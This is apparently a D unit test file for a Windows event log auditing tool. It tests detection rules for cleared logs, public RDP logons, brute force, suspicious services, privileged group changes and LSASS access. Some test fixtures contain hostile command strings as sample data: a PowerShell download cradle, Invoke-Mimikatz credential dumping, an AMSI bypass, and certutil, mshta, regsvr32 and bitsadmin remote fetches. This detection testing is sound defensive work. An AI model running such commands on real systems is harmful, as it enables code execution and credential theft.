module test;

import std.algorithm : canFind, map, sort;
import std.array : array, join, replicate;
import std.conv : to;
import std.format : format;
import std.stdio : writeln;
import std.string : toLower;
import core.stdc.stdlib : exit;

import evtx;

int passed, failed;

void check(bool ok, string name)
{
    if (ok) passed++;
    else
    {
        failed++;
        writeln("FAIL: ", name);
    }
}

string rules(string text)
{
    return audit(text, "t.json").map!(f => f.rule).array.sort.array.join(",");
}

// flat event with extra fields given as raw JSON members
string ev(int id, string extra = "", string t = "2026-11-14T02:00:00Z")
{
    return format(`{"EventID":%s,"Computer":"HOST1","TimeCreated":"%s"%s}`, id, t, extra.length ? "," ~ extra : "");
}

string lines(string[] evs) { return evs.join("\n") ~ "\n"; }

void main()
{
    // shapes
    check(rules(`{"Event":{"System":{"EventID":1102,"Computer":"H"},"EventData":{"SubjectUserName":"x"}}}`) == "EVT001", "nested evtx_dump shape");
    check(rules(`{"EventID":1102}`) == "EVT001", "flat shape");
    check(rules(`{"Event":{"System":{"EventID":{"#text":"1102"}}}}`) == "EVT001", "EventID with #text");
    check(rules(`{"EventID":"1102"}`) == "EVT001", "EventID as string");
    check(rules(`{"eventid":1102}`) == "EVT001", "lowercase key");
    check(rules(`{"EVENTID":1102}`) == "EVT001", "uppercase key");
    check(rules(`[{"EventID":1102}]`) == "EVT001", "array");
    check(rules(`{"events":[{"EventID":1102}]}`) == "EVT001", "events wrapper");
    check(rules(`{"value":[{"EventID":1102}]}`) == "EVT001", "value wrapper");
    check(rules(`{"Records":[{"EventID":1102}]}`) == "EVT001", "Records wrapper");
    check(rules("{\"EventID\":1102}\n{\"EventID\":104}\n") == "EVT001,EVT001", "json lines");
    check(rules("{\"EventID\":1102}\r\n{\"EventID\":104}\r\n") == "EVT001,EVT001", "json lines with CRLF");
    check(rules("{\"EventID\":1102}\nnot json\n{\"EventID\":104}\n") == "EVT001,EVT001", "bad line skipped");
    check(rules("{\n  \"EventID\": 1102\n}\n") == "EVT001", "pretty printed single object");
    check(rules(`{"Event":{"EventData":{"Data":[{"@Name":"SubjectUserName","#text":"bob"}]},"System":{"EventID":1102}}}`) == "EVT001", "Data Name shape");
    check(rules(`{"Event":{"System":{"TimeCreated":{"#attributes":{"SystemTime":"2026-01-01T00:00:00Z"}},"EventID":1102}}}`) == "EVT001", "time attributes");

    // EVT001
    check(rules(ev(1102)) == "EVT001", "log cleared 1102");
    check(rules(ev(104)) == "EVT001", "log cleared 104");
    check(audit(ev(1102), "t")[0].sev == "critical", "EVT001 is critical");
    check(audit(ev(1102, `"SubjectUserName":"eve"`), "t")[0].msg.canFind("eve"), "EVT001 names the account");

    // EVT002
    check(rules(ev(4624, `"LogonType":10,"IpAddress":"203.0.114.9"`)) == "EVT002", "rdp from public");
    check(rules(ev(4624, `"LogonType":"10","IpAddress":"203.0.114.9"`)) == "EVT002", "logon type as string");
    check(rules(ev(4624, `"LogonType":10,"IpAddress":"10.0.0.5"`)) == "", "rdp from private");
    check(rules(ev(4624, `"LogonType":10,"IpAddress":"192.168.1.5"`)) == "", "rdp from 192.168");
    check(rules(ev(4624, `"LogonType":10,"IpAddress":"172.16.0.5"`)) == "", "rdp from 172.16");
    check(rules(ev(4624, `"LogonType":10,"IpAddress":"172.32.0.5"`)) == "EVT002", "172.32 is public");
    check(rules(ev(4624, `"LogonType":10,"IpAddress":"127.0.0.1"`)) == "", "rdp from loopback");
    check(rules(ev(4624, `"LogonType":10,"IpAddress":"-"`)) == "", "rdp with dash address");
    check(rules(ev(4624, `"LogonType":10,"IpAddress":"::1"`)) == "", "rdp from ipv6 loopback");
    check(rules(ev(4624, `"LogonType":10,"IpAddress":"2001:db8::1"`)) == "EVT002", "rdp from public ipv6");
    check(rules(ev(4624, `"LogonType":10,"IpAddress":"fe80::1"`)) == "", "rdp from link-local ipv6");
    check(rules(ev(4624, `"LogonType":3,"IpAddress":"203.0.114.9"`)) == "", "network logon is not rdp");
    check(rules(ev(4624, `"LogonType":10,"IpAddress":"WORKSTATION"`)) == "", "host name treated as internal");
    check(rules(ev(4624, `"LogonType":10,"SourceNetworkAddress":"203.0.114.9"`)) == "EVT002", "SourceNetworkAddress fallback");
    check(isInternal("10.1.2.3") && isInternal("100.64.1.1") && isInternal("169.254.1.1") && !isInternal("8.8.8.8"), "isInternal ranges");

    // EVT003
    string[] fails(int n, string ip = "203.0.114.9")
    {
        string[] r;
        foreach (i; 0 .. n) r ~= ev(4625, format(`"IpAddress":"%s","TargetUserName":"u%s"`, ip, i), format("2026-11-14T02:%02d:00Z", i));
        return r;
    }
    check(rules(lines(fails(9))) == "", "nine failures is fine");
    check(rules(lines(fails(10))) == "EVT003", "ten failures");
    check(rules(lines(fails(10, "203.0.114.9") ~ fails(10, "203.0.114.10"))) == "EVT003,EVT003", "two sources");
    check(rules(lines(fails(5, "203.0.114.9") ~ fails(5, "203.0.114.10"))) == "", "failures spread over sources");
    check(rules(lines(fails(10, "-"))) == "", "dash address ignored");
    check(rules(lines(fails(10, ""))) == "", "empty address ignored");
    check(audit(lines(fails(10)), "t")[0].msg.canFind("10 failed logons from 203.0.114.9"), "EVT003 message");

    // EVT004
    check(rules(lines(fails(5) ~ [ev(4624, `"IpAddress":"203.0.114.9","TargetUserName":"bob"`, "2026-11-14T03:00:00Z")])) == "EVT004", "success after five failures");
    check(rules(lines(fails(4) ~ [ev(4624, `"IpAddress":"203.0.114.9","TargetUserName":"bob"`, "2026-11-14T03:00:00Z")])) == "", "four failures then success");
    check(rules(lines([ev(4624, `"IpAddress":"203.0.114.9","TargetUserName":"bob"`, "2026-11-14T01:00:00Z")] ~ fails(5))) == "", "success before failures");
    check(rules(lines(fails(5) ~ [ev(4624, `"IpAddress":"203.0.114.10","TargetUserName":"bob"`, "2026-11-14T03:00:00Z")])) == "", "success from another address");
    check(rules(lines(fails(5) ~ [ev(4624, `"IpAddress":"203.0.114.9"`, "2026-11-14T03:00:00Z"), ev(4624, `"IpAddress":"203.0.114.9"`, "2026-11-14T03:05:00Z")])) == "EVT004", "success reported once");
    check(rules(lines([ev(4624, `"IpAddress":"203.0.114.9"`, "2026-11-14T03:00:00Z")] ~ fails(5))) == "EVT004", "records are ordered by time stamp, not file order");
    check(rules(lines(fails(10) ~ [ev(4624, `"IpAddress":"203.0.114.9"`, "2026-11-14T03:00:00Z")])) == "EVT003,EVT004", "both brute force and success");
    check(audit(lines(fails(5) ~ [ev(4624, `"IpAddress":"203.0.114.9"`, "2026-11-14T03:00:00Z")]), "t")[0].sev == "critical", "EVT004 is critical");

    // EVT005 / EVT006
    check(rules(ev(7045, `"ServiceName":"s","ImagePath":"C:\\Program Files\\App\\app.exe"`)) == "EVT006", "normal service");
    check(rules(ev(7045, `"ServiceName":"s","ImagePath":"cmd.exe /c whoami"`)) == "EVT005", "cmd service");
    check(rules(ev(7045, `"ServiceName":"s","ImagePath":"C:\\Users\\bob\\AppData\\Local\\x.exe"`)) == "EVT005", "appdata service");
    check(rules(ev(7045, `"ServiceName":"s","ImagePath":"C:\\Windows\\Temp\\x.exe"`)) == "EVT005", "temp service");
    check(rules(ev(7045, `"ServiceName":"s","ImagePath":"powershell -nop"`)) == "EVT005", "powershell service");
    check(rules(ev(7045, `"ServiceName":"s","ServiceFileName":"C:\\Windows\\Temp\\x.exe"`)) == "EVT005", "ServiceFileName field");
    check(rules(ev(7045)) == "EVT006", "service with no fields");
    check(audit(ev(7045), "t")[0].sev == "medium", "EVT006 is medium");

    // EVT007
    foreach (id; [4728, 4732, 4756])
        check(rules(ev(id, `"TargetUserName":"Administrators","MemberName":"CN=x"`)) == "EVT007", "group add " ~ id.to!string);
    check(rules(ev(4728, `"TargetUserName":"Domain Admins"`)) == "EVT007", "domain admins");
    check(rules(ev(4728, `"TargetUserName":"Enterprise Admins"`)) == "EVT007", "enterprise admins");
    check(rules(ev(4732, `"TargetUserName":"Remote Desktop Users"`)) == "", "non privileged group");
    check(rules(ev(4732, `"TargetUserName":"Helpdesk"`)) == "", "helpdesk group");
    check(rules(ev(4732)) == "", "group add without group");
    check(rules(ev(4732, `"TargetUserName":"administrators"`)) == "EVT007", "group name case-insensitive");

    // EVT008 / 009 / 010
    check(rules(ev(4720, `"TargetUserName":"newuser"`)) == "EVT008", "account created");
    check(rules(ev(4719)) == "EVT009", "audit policy changed");
    check(rules(ev(4698, `"TaskName":"\\Task"`)) == "EVT010", "scheduled task");
    check(rules(ev(4698)) == "EVT010", "scheduled task without name");

    // EVT011
    check(rules(ev(4104, `"ScriptBlockText":"IEX (New-Object Net.WebClient).DownloadString('http://x')"`)) == "EVT011", "download cradle");
    check(rules(ev(4104, `"ScriptBlockText":"powershell -enc SQBFAFgA"`)) == "EVT011", "encoded command");
    check(rules(ev(4104, `"ScriptBlockText":"[Convert]::FromBase64String($x)"`)) == "EVT011", "FromBase64String");
    check(rules(ev(4104, `"ScriptBlockText":"Invoke-Mimikatz -DumpCreds"`)) == "EVT011", "mimikatz");
    check(rules(ev(4104, `"ScriptBlockText":"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"`)) == "EVT011", "amsi");
    check(rules(ev(4104, `"ScriptBlockText":"Get-ChildItem C:\\temp"`)) == "", "benign script");
    check(rules(ev(4104)) == "", "script block without text");
    check(audit(ev(4104, `"ScriptBlockText":"Invoke-Mimikatz"`), "t")[0].sev == "high", "EVT011 is high");

    // EVT012
    check(rules(ev(4688, `"NewProcessName":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil -urlcache -f http://x/a a.exe"`)) == "EVT012", "certutil urlcache");
    check(rules(ev(4688, `"NewProcessName":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta http://x/a.hta"`)) == "EVT012", "mshta http");
    check(rules(ev(4688, `"NewProcessName":"C:\\Windows\\System32\\regsvr32.exe","CommandLine":"regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll"`)) == "EVT012", "regsvr32 scrobj");
    check(rules(ev(4688, `"NewProcessName":"C:\\Windows\\System32\\bitsadmin.exe","CommandLine":"bitsadmin /transfer j http://x/a a.exe"`)) == "EVT012", "bitsadmin transfer");
    check(rules(ev(4688, `"NewProcessName":"C:\\Windows\\System32\\wbem\\wmic.exe","CommandLine":"wmic process call create calc.exe"`)) == "EVT012", "wmic call create");
    check(rules(ev(4688, `"NewProcessName":"C:\\Windows\\System32\\rundll32.exe","CommandLine":"rundll32 javascript:alert(1)"`)) == "EVT012", "rundll32 javascript");
    check(rules(ev(4688, `"NewProcessName":"C:\\Windows\\System32\\powershell.exe","CommandLine":"powershell -nop -w hidden -enc AAAA"`)) == "EVT012", "powershell encoded");
    check(rules(ev(1, `"Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil -urlcache -f http://x/a a.exe"`)) == "EVT012", "sysmon 1");
    check(rules(ev(4688, `"NewProcessName":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil -hashfile a.exe sha256"`)) == "", "certutil hashfile is fine");
    check(rules(ev(4688, `"NewProcessName":"C:\\Windows\\System32\\notepad.exe","CommandLine":"notepad a.txt"`)) == "", "notepad");
    check(rules(ev(4688, `"NewProcessName":"C:\\Windows\\System32\\mshta.exe","CommandLine":"mshta local.hta"`)) == "", "mshta local");
    check(rules(ev(4688)) == "", "process without fields");

    // EVT013
    check(rules(ev(10, `"SourceImage":"C:\\Temp\\x.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x1010"`)) == "EVT013", "lsass 0x1010");
    check(rules(ev(10, `"SourceImage":"C:\\Temp\\x.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x1FFFFF"`)) == "EVT013", "lsass full access, uppercase hex");
    check(rules(ev(10, `"SourceImage":"C:\\Temp\\x.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x1000"`)) == "", "lsass limited access");
    check(rules(ev(10, `"SourceImage":"C:\\Temp\\x.exe","TargetImage":"C:\\Windows\\System32\\notepad.exe","GrantedAccess":"0x1010"`)) == "", "other target");
    check(rules(ev(10, `"SourceImage":"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe","TargetImage":"C:\\Windows\\System32\\lsass.exe","GrantedAccess":"0x1010"`)) == "", "defender allowed");

    // other events
    check(rules(ev(4624, `"LogonType":2,"IpAddress":"-"`)) == "", "interactive logon");
    check(rules(ev(9999)) == "", "unknown event id");

    // EVT000
    check(rules("") == "EVT000", "empty text");
    check(rules("   \n") == "EVT000", "blank");
    check(rules("[]") == "EVT000", "empty array");
    check(rules("{}") == "EVT000", "empty object");
    check(rules("not json at all") == "EVT000", "garbage");
    check(rules(`{"a":1}`) == "EVT000", "object without event id");
    check(rules(`[1,2,"x",null]`) == "EVT000", "array of scalars");
    check(rules("42") == "EVT000", "number");
    check(audit("", "e")[0].sev == "info", "EVT000 is info");

    // locations
    auto w = audit(lines([ev(4625, `"IpAddress":"-"`), ev(1102)]), "x.jsonl");
    check(w.length == 1 && w[0].line == 2 && w[0].file == "x.jsonl", "line number of JSON Lines record");
    auto w2 = audit(`[{"EventID":1},{"EventID":1102}]`, "x.json");
    check(w2.length == 1 && w2[0].line == 2, "index of array record");

    // sorting
    auto fl = [Finding("low", "B", "a", 1, ""), Finding("high", "A", "z", 1, ""), Finding("high", "A", "a", 10, ""), Finding("high", "A", "a", 2, "")];
    auto sorted = sortFindings(fl);
    check(sorted.map!(f => f.file ~ f.line.to!string).array.join(" ") == "a2 a10 z1 a1", "sort by severity, file, numeric line");
    check(rank("critical") < rank("high") && rank("low") < rank("info"), "rank order");

    // hostile input
    check(rules("[".replicate(5000) ~ "]".replicate(5000)) == "EVT000", "deeply nested arrays");
    check(rules(`{"a":`.replicate(5000) ~ "1" ~ "}".replicate(5000)) == "EVT000", "deeply nested objects");
    check(rules("\0\1\2\xff\xfe") == "EVT000", "binary text");
    check(rules(`{"EventID":1102,"x":"` ~ "a".replicate(1_000_000) ~ `"}`) == "EVT001", "one megabyte string");
    string many;
    foreach (i; 0 .. 20000) many ~= `{"EventID":1}` ~ "\n";
    check(rules(many) == "", "many events");

    // fuzz
    string[] bits = [`{`, `}`, `[`, `]`, `,`, `:`, `"EventID"`, `1102`, `"4625"`, `"IpAddress"`, `"203.0.114.9"`, `null`, `true`, `"#text"`, `"@Name"`, `"Data"`, "\n", `"x"`, `1.5`, `-1`];
    uint seed = 7;
    uint next() { seed = seed * 1103515245u + 12345u; return (seed >> 8) & 0xFFFFF; }
    int crashed;
    foreach (i; 0 .. 3000)
    {
        string t;
        foreach (j; 0 .. 1 + next() % 40) t ~= bits[next() % bits.length];
        try { audit(t, "f"); } catch (Exception) { crashed++; }
    }
    string valid = lines(fails(10) ~ [ev(4624, `"IpAddress":"203.0.114.9","LogonType":10`)]);
    foreach (i; 0 .. valid.length + 1)
    {
        try { audit(valid[0 .. i], "f"); } catch (Exception) { crashed++; }
    }
    check(crashed == 0, "random and truncated inputs do not throw");

    writeln(passed, " passed, ", failed, " failed");
    if (failed != 0) exit(1);
}
